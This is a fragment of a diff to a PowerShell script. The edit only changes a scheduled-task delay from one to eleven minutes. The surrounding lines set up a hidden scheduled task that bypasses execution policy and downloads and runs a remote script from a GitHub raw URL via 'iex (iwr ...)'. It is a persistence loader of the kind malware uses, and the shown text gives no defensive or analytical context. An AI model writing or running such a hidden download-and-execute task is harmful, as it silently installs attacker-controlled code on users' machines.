@@ -329,7 +329,7 @@ $shortcut.Save()
 
 
 $currentTime = Get-Date
-$triggerTime = $currentTime.AddMinutes(1)
+$triggerTime = $currentTime.AddMinutes(11)
 
 $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument @"
 -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "iex (iwr 'https://raw.githubusercontent.com/Zyg0s/VI_ASTRA/refs/heads/main/dabididabudai.ps1').Content"
